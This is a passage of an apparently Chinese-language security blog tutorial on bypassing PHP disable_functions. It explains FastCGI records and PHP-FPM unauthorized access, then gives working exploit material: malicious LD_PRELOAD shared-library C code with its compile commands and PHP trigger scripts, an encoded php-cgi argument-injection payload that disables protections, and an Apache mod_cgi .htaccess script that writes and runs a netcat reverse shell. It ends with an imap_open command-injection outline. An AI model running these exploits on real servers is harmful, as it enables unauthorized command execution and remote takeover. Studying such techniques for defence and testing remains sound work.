requestIdB0;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> contentLengthB1; <span class="comment">// body体的大小</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> contentLengthB0;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> paddingLength; <span class="comment">// 额外块大小</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> reserved; </span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Body */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> contentData[contentLength];</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> paddingData[paddingLength];</span><br><span class="line">&#125; FCGI_Record;</span><br></pre></td></tr></table></figure>

<p>而其中的<code>type</code>就是指定该record的作用。因为fastcgi一个record的大小是有限的，作用也是单一的，所以我们需要在一个TCP流里传输多个record。通过<code>type</code>来标志每个record的作用，用<code>requestId</code>作为同一次请求的id。</p>
<p>也就是说，每次请求，会有多个record，他们的<code>requestId</code>是相同的。</p>
<p>借用<a target="_blank" rel="noopener" href="http://blog.csdn.net/shreck66/article/details/50355729">该文章</a>中的一个表格，列出最主要的几种<code>type</code>：</p>
<p><img src="https://i.loli.net/2019/09/10/4CbPDvp6XlAkWiI.png" alt="image5295"></p>
<p>根据这个表格我们可以猜测，服务器中间件和后端语言通信，第一个数据包就是<code>type</code>为1的record，后续互相交流，发送<code>type</code>为4、5、6、7的record，结束时发送<code>type</code>为2、3的record。</p>
<p>我们要关注的重点就是type=4的部分,也就是是设置环境变量的地方。</p>
<p>php里有很多有趣的设置,像文件包含里常用的php设置<code>auto_prepared_file,auto_append_file</code></p>
<p>我们令<code>auto_prepared_file=php://input</code>且<code>allow_url_include=On</code></p>
<p>那么我们该如何利用fastcgi来设置php的环境变量</p>
<p>这又涉及到PHP-FPM的两个环境变量，<code>PHP_VALUE</code>和<code>PHP_ADMIN_VALUE</code>。这两个环境变量就是用来设置PHP配置项的，<code>PHP_VALUE</code>可以设置模式为<code>PHP_INI_USER</code>和<code>PHP_INI_ALL</code>的选项，<code>PHP_ADMIN_VALUE</code>可以设置所有选项。（<code>disable_functions</code>除外，这个选项是PHP加载的时候就确定了，在范围内的函数直接不会被加载到PHP上下文中）</p>
<p>结构体实例:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">array</span>(</span><br><span class="line">		<span class="string">&#x27;GATEWAY_INTERFACE&#x27;</span> =&gt; <span class="string">&#x27;FastCGI/1.0&#x27;</span>,</span><br><span class="line">		<span class="string">&#x27;REQUEST_METHOD&#x27;</span> =&gt; <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">		<span class="string">&#x27;SCRIPT_FILENAME&#x27;</span> =&gt; <span class="string">&#x27;/var/www/html/index.php&#x27;</span>,</span><br><span class="line">		<span class="string">&#x27;SERVER_SOFTWARE&#x27;</span> =&gt; <span class="string">&#x27;php/fcgiclient&#x27;</span>,</span><br><span class="line">		<span class="string">&#x27;REMOTE_ADDR&#x27;</span> =&gt; <span class="string">&#x27;127.0.0.1&#x27;</span>,</span><br><span class="line">		<span class="string">&#x27;REMOTE_PORT&#x27;</span> =&gt; <span class="string">&#x27;9985&#x27;</span>,</span><br><span class="line">		<span class="string">&#x27;SERVER_ADDR&#x27;</span> =&gt; <span class="string">&#x27;127.0.0.1&#x27;</span>,</span><br><span class="line">		<span class="string">&#x27;SERVER_PORT&#x27;</span> =&gt; <span class="string">&#x27;80&#x27;</span>,</span><br><span class="line">		<span class="string">&#x27;SERVER_NAME&#x27;</span> =&gt; <span class="string">&#x27;mag-tured&#x27;</span>,</span><br><span class="line">		<span class="string">&#x27;SERVER_PROTOCOL&#x27;</span> =&gt; <span class="string">&#x27;HTTP/1.1&#x27;</span>,</span><br><span class="line">		<span class="string">&#x27;CONTENT_TYPE&#x27;</span> =&gt; <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;CONTENT_LENGTH&#x27;</span> =&gt; strlen(<span class="variable">$content</span>),</span><br><span class="line">        <span class="string">&#x27;PHP_VALUE&#x27;</span> =&gt;<span class="string">&#x27;auto_append_file=php://input&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;PHP_ADMIN_VALUE&#x27;</span>=&gt;<span class="string">&#x27;allow_url_include=On&#x27;</span></span><br><span class="line">	)</span><br></pre></td></tr></table></figure>



<h3 id="原理浅析"><a href="#原理浅析" class="headerlink" title="原理浅析"></a>原理浅析</h3><p>这个原理的漏洞原因是PHP-FPM未授权访问漏洞,php-fpm没有对发送数据的来源进行验证,导致只要我们向php-fpm发送符合格式的数据就可以被解析.再结合fastcgi设置环境变量的部分来达到getshell</p>
<h3 id="fpm利用脚本"><a href="#fpm利用脚本" class="headerlink" title="fpm利用脚本"></a>fpm利用脚本</h3><p>分享个p牛脚本里面的一个client客户端: <a target="_blank" rel="noopener" href="https://github.com/wuyunfeng/Python-FastCGI-Client">Python FastCGI Client</a><br>还有Lz1y师傅给的一个php客户端 <a target="_blank" rel="noopener" href="https://github.com/adoy/PHP-FastCGI-Client.git">PHP FastCGI Client</a></p>
<p>还要php语言客户端: <a target="_blank" rel="noopener" href="http://nullget.sourceforge.net/?q=node/795&lang=zh-hans">fastcgi客户端PHP语言实现</a></p>
<h2 id="LD-PRELOAD绕过"><a href="#LD-PRELOAD绕过" class="headerlink" title="LD_PRELOAD绕过"></a>LD_PRELOAD绕过</h2><h3 id="send-mail"><a href="#send-mail" class="headerlink" title="send_mail"></a>send_mail</h3><p>这里我们先来看一下原理，首先什么是LD_PRELOAD？</p>
<p>google给出如下定义</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LD_PRELOAD is an optional environmental variable containing one or more paths to shared libraries, or shared objects, that the loader will load before any other shared library including the C runtime library (libc.so) This is called preloading a library.</span><br></pre></td></tr></table></figure>

<p>即LD_PRELOAD这个环境变量指定路径的文件，会在其他文件被调用前，最先被调用</p>
<p>而putenv可以设置环境变量</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">putenv ( <span class="keyword">string</span> <span class="variable">$setting</span> ) : <span class="keyword">bool</span></span><br></pre></td></tr></table></figure>

<p>添加 setting 到服务器环境变量。 环境变量仅存活于当前请求期间。 在请求结束时环境会恢复到初始状态。</p>
<p>那么我们可以进行一下骚操作</p>
<blockquote>
<p>1.制作一个恶意shared libraries<br>2.使用putenv设置LD_PRELOAD为恶意文件路径<br>3.使用某个php函数，触发specific shared library</p>
</blockquote>
<h4 id="利用函数"><a href="#利用函数" class="headerlink" title="利用函数"></a>利用函数</h4><p><code>putenv,errorlog,mail</code></p>
<h4 id="如何制作shared-libraries"><a href="#如何制作shared-libraries" class="headerlink" title="如何制作shared libraries"></a>如何制作shared libraries</h4><p>选择要替换的函数我们这里选取geteuid()</p>
<p>理由是php的mail()函数会调用系统的sendmail命令而sendmail命令会调用getuid()这个函数,所以我们确定目标为geteuid函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">payload</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	system(<span class="string">&quot;ls &gt; result.txt&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">    <span class="function"><span class="keyword">int</span>  <span class="title">geteuid</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (getenv(<span class="string">&quot;LD_PRELOAD&quot;</span>) == <span class="literal">NULL</span>) </span><br><span class="line">    &#123; <span class="keyword">return</span> <span class="number">0</span>; &#125;</span><br><span class="line">    unsetenv(<span class="string">&quot;LD_PRELOAD&quot;</span>);</span><br><span class="line">    payload();</span><br><span class="line">  	&#125;</span><br></pre></td></tr></table></figure>

<p>当这个共享库中的 <code>geteuid</code> 被调用时，尝试加载 <code>payload()</code> 函数，执行命令。这个测试函数写的很简单，实际应用时可相应调整完善。在攻击机上（注意编译平台应和靶机平台相近，至少不能一个是 32 位一个是 64 位）把它编译为一个位置信息无关的动态共享库：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -c -fPIC hack.c -o hack</span><br><span class="line">gcc -shared hack -o hack.so</span><br></pre></td></tr></table></figure>

<h4 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h4><p>将恶意的.so文件上传到服务器</p>
<p>执行如下代码,即可载入恶意命令</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">putenv(<span class="string">&quot;LD_PRELOAD=/var/www/hack.so&quot;</span>);</span><br><span class="line">mail(<span class="string">&quot;[email protected]&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="相关文章"><a href="#相关文章" class="headerlink" title="相关文章"></a>相关文章</h4><p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/175403">https://www.anquanke.com/post/id/175403</a></p>
<p><a target="_blank" rel="noopener" href="https://www.tr0y.wang/2018/04/18/PHPDisalbedfunc/index.html">https://www.tr0y.wang/2018/04/18/PHPDisalbedfunc/index.html</a></p>
<p>[<a target="_blank" rel="noopener" href="https://www.k0rz3n.com/2019/02/12/PHP%20%E4%B8%AD%E5%8F%AF%E4%BB%A5%E5%88%A9%E7%94%A8%E7%9A%84%E5%8D%B1%E9%99%A9%E7%9A%84%E5%87%BD%E6%95%B0/#8-mail-%E7%AC%AC%E4%BA%94%E4%B8%AA%E5%8F%82%E6%95%B0-excrt-cmd]">https://www.k0rz3n.com/2019/02/12/PHP%20%E4%B8%AD%E5%8F%AF%E4%BB%A5%E5%88%A9%E7%94%A8%E7%9A%84%E5%8D%B1%E9%99%A9%E7%9A%84%E5%87%BD%E6%95%B0/#8-mail-%E7%AC%AC%E4%BA%94%E4%B8%AA%E5%8F%82%E6%95%B0-excrt-cmd]</a>(<a target="_blank" rel="noopener" href="https://www.k0rz3n.com/2019/02/12/PHP">https://www.k0rz3n.com/2019/02/12/PHP</a> 中可以利用的危险的函数/#8-mail-第五个参数-excrt-cmd)</p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/169156.html">https://www.freebuf.com/articles/web/169156.html</a></p>
<h3 id="without-sendmail"><a href="#without-sendmail" class="headerlink" title="without sendmail"></a>without sendmail</h3><p> <a target="_blank" rel="noopener" href="https://www.mi1k7ea.com/2019/06/02/%E6%B5%85%E8%B0%88%E5%87%A0%E7%A7%8DBypass-disable-functions%E7%9A%84%E6%96%B9%E6%B3%95/#Method2%E2%80%94%E2%80%94%E5%8A%AB%E6%8C%81%E5%90%AF%E5%8A%A8%E8%BF%9B%E7%A8%8B">参考链接</a> </p>
<blockquote>
<p>回到 LD_PRELOAD 本身，系统通过它预先加载共享对象，如果能找到一个方式，在加载时就执行代码，而不用考虑劫持某一系统函数，那我就完全可以不依赖 sendmail 了。这种场景与 C++ 的构造函数简直神似！</p>
<p>GCC 有个 C 语言扩展修饰符 <code>__attribute__((constructor))</code>，可以让由它修饰的函数在 main() 之前执行，若它出现在共享对象中时，那么一旦共享对象被系统加载，立即将执行 <code>__attribute__((constructor))</code> 修饰的函数。这一细节非常重要，很多朋友用 LD_PRELOAD 手法突破 disable_functions 无法做到百分百成功，正因为这个原因，<strong>不要局限于仅劫持某一函数，而应考虑拦劫启动进程这一行为</strong>。</p>
<p>此外，我通过 LD_PRELOAD 劫持了启动进程的行为，劫持后又启动了另外的新进程，若不在新进程启动前取消 LD_PRELOAD，则将陷入无限循环，所以必须得删除环境变量 LD_PRELOAD。最直观的做法是调用 <code>unsetenv(&quot;LD_PRELOAD&quot;)</code>，这在大部份 linux 发行套件上的确可行，但在 centos 上却无效，究其原因，centos 自己也 hook 了 unsetenv()，在其内部启动了其他进程，根本来不及删除 LD_PRELOAD 就又被劫持，导致无限循环。所以，我得找一种比 unsetenv() 更直接的删除环境变量的方式。是它，全局变量 <code>extern char** environ</code>！实际上，unsetenv() 就是对 environ 的简单封装实现的环境变量删除功能。</p>
</blockquote>
<h4 id="由于open-basedir-web目录不可写绕过"><a href="#由于open-basedir-web目录不可写绕过" class="headerlink" title="由于open_basedir+web目录不可写绕过"></a>由于open_basedir+web目录不可写绕过</h4><p>见 bypass open_basedir 的 tmpfile部分</p>
<h4 id="攻击利用"><a href="#攻击利用" class="headerlink" title="攻击利用"></a>攻击利用</h4><p>bypass_disablefunc.c</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">#define _GNU_SOURCE</span><br><span class="line"></span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">extern char** environ;</span><br><span class="line"></span><br><span class="line">__attribute__ ((__constructor__)) void preload (void)</span><br><span class="line">&#123;</span><br><span class="line">    // get command line options and arg</span><br><span class="line">    const char* cmdline = getenv(&quot;EVIL_CMDLINE&quot;);</span><br><span class="line"></span><br><span class="line">    // unset environment variable LD_PRELOAD.</span><br><span class="line">    // unsetenv(&quot;LD_PRELOAD&quot;) no effect on some </span><br><span class="line">    // distribution (e.g., centos), I need crafty trick.</span><br><span class="line">    int i;</span><br><span class="line">    for (i = 0; environ[i]; ++i) &#123;</span><br><span class="line">            if (strstr(environ[i], &quot;LD_PRELOAD&quot;)) &#123;</span><br><span class="line">                    environ[i][0] = &#x27;\0&#x27;;</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // executive command</span><br><span class="line">    system(cmdline);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>接着用以下语句编译C文件为共享对象文件：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -shared -fPIC bypass_disablefunc.c -o bypass_disablefunc.so</span><br></pre></td></tr></table></figure>

<p>bypass_disablefunc.php，代码和test.php一致：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$cmd</span> = <span class="string">&quot;ls&quot;</span>;</span><br><span class="line">    <span class="variable">$out_path</span> = <span class="string">&quot;/tmp/cmdout&quot;</span>;</span><br><span class="line">    <span class="variable">$evil_cmdline</span> = <span class="variable">$cmd</span> . <span class="string">&quot; &gt; &quot;</span> . <span class="variable">$out_path</span> . <span class="string">&quot; 2&gt;&amp;1&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt; &lt;b&gt;cmdline&lt;/b&gt;: &quot;</span> . <span class="variable">$evil_cmdline</span> . <span class="string">&quot;&lt;/p&gt;&quot;</span>;</span><br><span class="line">    putenv(<span class="string">&quot;EVIL_CMDLINE=&quot;</span> . <span class="variable">$evil_cmdline</span>);</span><br><span class="line">    <span class="variable">$so_path</span> = <span class="string">&quot;/var/www/html/bypass_disablefunc.so&quot;</span>;</span><br><span class="line">    putenv(<span class="string">&quot;LD_PRELOAD=&quot;</span> . <span class="variable">$so_path</span>);</span><br><span class="line">    mail(<span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt; &lt;b&gt;output&lt;/b&gt;: &lt;br /&gt;&quot;</span> . nl2br(file_get_contents(<span class="variable">$out_path</span>)) . <span class="string">&quot;&lt;/p&gt;&quot;</span>; </span><br><span class="line">    unlink(<span class="variable">$out_path</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<h2 id="apache-php-cgi-mod攻击"><a href="#apache-php-cgi-mod攻击" class="headerlink" title="apache+php cgi mod攻击"></a>apache+php cgi mod攻击</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>php作为cgi模式运行的时候，接受-s  -d -c 这样的参数，我们看看这些参数的功能</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-s Output HTML syntax highlighted source -d foo[=bar] Define INI entry foo with value bar</span><br></pre></td></tr></table></figure>

<p>然后再看看攻击代码片段</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">char poststr[] = <span class="string">&quot;POST %s?%%2D%%64+%%61%%6C%%6C%%6F%%77%%5F&quot;</span> \ <span class="string">&quot;%%75%%72%%6C%%5F%%69%%6E%%63%%6C%%75%%64%%65%%3D%%6F%%6E+%%2D%%64&quot;</span> \ <span class="string">&quot;+%%73%%61%%66%%65%%5F%%6D%%6F%%64%%65%%3D%%6F%%66%%66+%%2D%%64+%%73&quot;</span> \ <span class="string">&quot;%%75%%68%%6F%%73%%69%%6E%%2E%%73%%69%%6D%%75%%6C%%61%%74%%69%%6F%%6E&quot;</span> \ <span class="string">&quot;%%3D%%6F%%6E+%%2D%%64+%%64%%69%%73%%61%%62%%6C%%65%%5F%%66%%75%%6E%%63&quot;</span> \ <span class="string">&quot;%%74%%69%%6F%%6E%%73%%3D%%22%%22+%%2D%%64+%%6F%%70%%65%%6E%%5F%%62&quot;</span> \ <span class="string">&quot;%%61%%73%%65%%64%%69%%72%%3D%%6E%%6F%%6E%%65+%%2D%%64+%%61%%75%%74&quot;</span> \ <span class="string">&quot;%%6F%%5F%%70%%72%%65%%70%%65%%6E%%64%%5F%%66%%69%%6C%%65%%3D%%70%%68&quot;</span> \ <span class="string">&quot;%%70%%3A%%2F%%2F%%69%%6E%%70%%75%%74+%%2D%%64+%%63%%67%%69%%2E%%66%%6F&quot;</span> \ <span class="string">&quot;%%72%%63%%65%%5F%%72%%65%%64%%69%%72%%65%%63%%74%%3D%%30+%%2D%%64+%%63&quot;</span> \ <span class="string">&quot;%%67%%69%%2E%%72%%65%%64%%69%%72%%65%%63%%74%%5F%%73%%74%%61%%74%%75%%73&quot;</span> \ <span class="string">&quot;%%5F%%65%%6E%%76%%3D%%30+%%2D%%6E HTTP/1.1\r\n&quot;</span> \</span><br></pre></td></tr></table></figure>



<p>解码出来是</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%s?-d allow_url_include=on -d safe_mode=off -d suhosin.simulation3Don -d disable_functions=<span class="string">&quot;&quot;</span> -d open_basedir=none -d auto_prepend_file=php:<span class="comment">//input -d cgi.fo&quot;rce_redirect=0 -d cgi.redirect_status_env=0 -n</span></span><br></pre></td></tr></table></figure>



<p>这样Kingcope的攻击代码思路就出来了。</p>
<p>关闭各种防护的参数，打开各种危险的参数，最后利用auto_prepend_file（或auto_append_file）这个参数把黑客需要执行的系统命令传递过去了。</p>
<h3 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h3><p>1、apache+php是用cgi模式跑的，例如apache的mod_cgid</p>
<p>2、php解释器需要可以从下面的url访问到，当然或许可能是其他的url，这个具体要看你的配置</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/cgi-bin/php</span><br><span class="line">/cgi-bin/php5</span><br><span class="line">/cgi-bin/php-cgi</span><br><span class="line">/cgi-bin/php.cgi</span><br><span class="line">/cgi-bin/php4</span><br></pre></td></tr></table></figure>

<p>3、php版本<br>PHP版本小于5.3.12<br>PHP版本小于5.4.2</p>
<p>或者</p>
<ol>
<li> mod_cgi已经启用 </li>
<li> 必须允许.htaccess文件 , 在httpd.conf中，要注意AllowOverride选项为All </li>
<li> 必须有权限写.htaccess文件</li>
</ol>
<h3 id="利用脚本"><a href="#利用脚本" class="headerlink" title="利用脚本"></a>利用脚本</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$cmd</span> = <span class="string">&quot;nc -c&#x27;/bin/bash&#x27; 127.0.0.1 4444&quot;</span>; <span class="comment">//反弹一个shell出来，这里用本地的4444端口</span></span><br><span class="line"><span class="variable">$shellfile</span> =<span class="string">&quot;#!/bin/bash\n&quot;</span>; <span class="comment">//指定shell</span></span><br><span class="line"><span class="variable">$shellfile</span> .=<span class="string">&quot;echo -ne \&quot;Content-Type: text/html\\n\\n\&quot;\n&quot;</span>; <span class="comment">//需要指定这个header，否则会返回500</span></span><br><span class="line"><span class="variable">$shellfile</span> .=<span class="string">&quot;<span class="subst">$cmd</span>&quot;</span>; </span><br><span class="line">functioncheckEnabled(<span class="variable">$text</span>,<span class="variable">$condition</span>,<span class="variable">$yes</span>,<span class="variable">$no</span>) <span class="comment">//this surely can be shorter</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$text</span>: &quot;</span> . (<span class="variable">$condition</span> ?<span class="variable">$yes</span> : <span class="variable">$no</span>) . <span class="string">&quot;&lt;br&gt;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;checked&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    @file_put_contents(<span class="string">&#x27;.htaccess&#x27;</span>,<span class="string">&quot;\nSetEnv HTACCESS on&quot;</span>, FILE_APPEND); </span><br><span class="line">    header(<span class="string">&#x27;Location: &#x27;</span> . <span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>]. <span class="string">&#x27;?checked=true&#x27;</span>); <span class="comment">//执行环境的检查</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$modcgi</span> = in_array(<span class="string">&#x27;mod_cgi&#x27;</span>,apache_get_modules()); <span class="comment">// 检测mod_cgi是否开启</span></span><br><span class="line">    <span class="variable">$writable</span> = is_writable(<span class="string">&#x27;.&#x27;</span>); <span class="comment">//检测当前目录是否可写</span></span><br><span class="line">    <span class="variable">$htaccess</span> = !<span class="keyword">empty</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTACCESS&#x27;</span>]);<span class="comment">//检测是否启用了.htaccess</span></span><br><span class="line">        checkEnabled(<span class="string">&quot;Mod-Cgienabled&quot;</span>,<span class="variable">$modcgi</span>,<span class="string">&quot;Yes&quot;</span>,<span class="string">&quot;No&quot;</span>);</span><br><span class="line">        checkEnabled(<span class="string">&quot;Iswritable&quot;</span>,<span class="variable">$writable</span>,<span class="string">&quot;Yes&quot;</span>,<span class="string">&quot;No&quot;</span>);</span><br><span class="line">        checkEnabled(<span class="string">&quot;htaccessworking&quot;</span>,<span class="variable">$htaccess</span>,<span class="string">&quot;Yes&quot;</span>,<span class="string">&quot;No&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$modcgi</span> &amp;&amp; <span class="variable">$writable</span>&amp;&amp; <span class="variable">$htaccess</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Error. All of the above mustbe true for the script to work!&quot;</span>; <span class="comment">//必须满足所有条件</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">       </span><br><span class="line"> checkEnabled(<span class="string">&quot;Backing </span></span><br><span class="line"><span class="string">up.htaccess&quot;</span>,copy(<span class="string">&quot;.htaccess&quot;</span>,<span class="string">&quot;.htaccess.bak&quot;</span>),<span class="string">&quot;Suceeded!Saved in </span></span><br><span class="line"><span class="string">.htaccess.bak&quot;</span>,<span class="string">&quot;Failed!&quot;</span>); <span class="comment">//备份一下原有.htaccess</span></span><br><span class="line">        </span><br><span class="line">checkEnabled(<span class="string">&quot;Write </span></span><br><span class="line"><span class="string">.htaccessfile&quot;</span>,file_put_contents(<span class="string">&#x27;.htaccess&#x27;</span>,<span class="string">&quot;Options </span></span><br><span class="line"><span class="string">+ExecCGI\nAddHandlercgi-script </span></span><br><span class="line"><span class="string">.dizzle&quot;</span>),<span class="string">&quot;Succeeded!&quot;</span>,<span class="string">&quot;Failed!&quot;</span>);<span class="comment">//.dizzle，我们的特定扩展名</span></span><br><span class="line">        checkEnabled(<span class="string">&quot;Write shellfile&quot;</span>,file_put_contents(<span class="string">&#x27;shell.dizzle&#x27;</span>,<span class="variable">$shellfile</span>),<span class="string">&quot;Succeeded!&quot;</span>,<span class="string">&quot;Failed!&quot;</span>);<span class="comment">//写入文件</span></span><br><span class="line">        checkEnabled(<span class="string">&quot;Chmod777&quot;</span>,chmod(<span class="string">&quot;shell.dizzle&quot;</span>,<span class="number">0777</span>),<span class="string">&quot;Succeeded!&quot;</span>,<span class="string">&quot;Failed!&quot;</span>);<span class="comment">//给权限</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Executing the script now.Check your listener &lt;img src = &#x27;shell.dizzle&#x27; style =&#x27;display:none;&#x27;&gt;&quot;</span>; <span class="comment">//调用</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<h2 id="imap-open"><a href="#imap-open" class="headerlink" title="imap_open"></a>imap_open</h2><blockquote>
<p>PHP 的imap_open函数中的漏洞可能允许经过身份验证的远程攻击者在目标系统上执行任意命令。该漏洞的存在是因为受影响的软件的imap_open函数在将邮箱名称传递给rsh或ssh命令之前不正确地过滤邮箱名称。如果启用了rsh和ssh功能并且rsh命令是ssh命令的符号链接，则攻击者可以通过向目标系统发送包含-oProxyCommand参数的恶意IMAP服务器名称来利用此漏洞。成功的攻击可能允许攻击者绕过其他禁用的exec 受影响软件中的功能，攻击者可利用这些功能在目标系统上执行任意shell命令。利用此漏洞的功能代码是Metasploit Framework的一部分。 </p>
</blockquote>
<h3 id="利用条件-1"><a href="#利用条件-1" class="headerlink" title="利用条件"></a>利用条件</h3><p>存在ssh和rsh功能 且  enable_insecure_rsh = true</p>
